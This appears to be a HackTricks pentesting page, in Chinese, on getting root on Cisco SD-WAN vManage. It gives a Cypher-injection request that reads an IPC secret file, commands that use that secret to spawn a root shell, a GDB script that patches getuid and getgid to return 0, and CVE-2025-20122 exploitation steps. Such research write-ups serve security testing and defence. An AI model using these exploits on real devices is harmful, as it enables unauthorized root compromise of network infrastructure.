# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

## 路径 1

(示例来自 [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

在查看了一些与 `confd` 和不同二进制文件相关的 [documentation](http://66.218.245.39/doc/html/rn03re18.html)（可通过 Cisco 网站的账户访问）之后，我们发现为了对 IPC socket 进行认证，它使用了位于 `/etc/confd/confd_ipc_secret` 的一个 secret：
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
还记得我们的 Neo4j 实例吗？它在 `vmanage` 用户权限下运行，因此允许我们利用之前的漏洞检索该文件：
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` 程序不支持命令行参数，但会以参数调用 `/usr/bin/confd_cli_user`。因此，我们可以直接用自己的参数调用 `/usr/bin/confd_cli_user`。然而以当前权限无法读取它，所以必须从 rootfs 中取出并用 scp 复制，查看帮助，然后用它获取 shell：
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## 路径 2

(示例来自 [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

该由 synacktiv 团队撰写的博客¹ 描述了一种获得 root shell 的优雅方法，但缺点是它需要获取 `/usr/bin/confd_cli_user` 的副本，而该文件只有 root 可读。我找到了另一种无需此麻烦即可提权到 root 的方法。

当我反汇编 `/usr/bin/confd_cli` 二进制文件时，我观察到如下：

<details>
<summary>Objdump 显示 UID/GID 收集</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

当我运行 “ps aux”, 我观察到以下内容 (_注意 -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
我推测 “confd_cli” 程序会把从已登录用户收集到的用户 ID 和组 ID 传给 “cmdptywrapper” 应用。

我最初的尝试是直接运行 “cmdptywrapper” 并传入 `-g 0 -u 0`，但失败了。看来在某处创建了一个文件描述符（-i 1015），我无法伪造它。

正如 synacktiv’s blog（最后一个示例）中提到的，`confd_cli` 程序不支持命令行参数，但我可以用调试器影响它，幸运的是系统中包含了 GDB。

我创建了一个 GDB 脚本，强制 API `getuid` 和 `getgid` 返回 0。由于我已经通过 deserialization RCE 拥有 “vmanage” 权限，我可以直接读取 `/etc/confd/confd_ipc_secret`。

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
控制台输出:

<details>
<summary>控制台输出</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## 路径 3 (2025 CLI input validation bug)

Cisco 把 vManage 重命名为 *Catalyst SD-WAN Manager*，但底层的 CLI 仍然在同一台机器上运行。一个 2025 年的咨询 (CVE-2025-20122) 描述了 CLI 中的输入验证不足，允许 **any authenticated local user** 通过向 manager CLI 服务发送精心构造的请求来获得 root。将任何 low-priv foothold（例如来自 Path1 的 Neo4j deserialization，或一个 cron/backup user shell）与此缺陷结合，即可在不复制 `confd_cli_user` 或附加 GDB 的情况下直接提权到 root：

1. 使用你的 low-priv shell 定位 CLI 的 IPC 端点（通常是 Path2 中在端口 4565 上显示的 `cmdptywrapper` listener）。
2. 构造一个 CLI 请求，将 UID/GID 字段伪造为 0。验证漏洞未能强制使用原始调用者的 UID，因此 wrapper 会启动一个以 root 支持的 PTY。
3. 将任意命令序列（`vshell; id`）通过伪造的请求管道传入以获取 root shell。

> 利用面仅限本地；remote code execution 仍然是获得初始 shell 的前提，但一旦进入机器，利用只需发送一条 IPC 消息，而不是通过 debugger-based UID patch。

## 其他近期可用于链式利用的 vManage/Catalyst SD-WAN Manager 漏洞

* **Authenticated UI XSS (CVE-2024-20475)** – 在特定界面字段注入 JavaScript；窃取 admin session 会给你一条通过浏览器驱动的路径到 `vshell` → local shell → Path3 获取 root。

## References

- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)

{{#include ../../banners/hacktricks-training.md}}
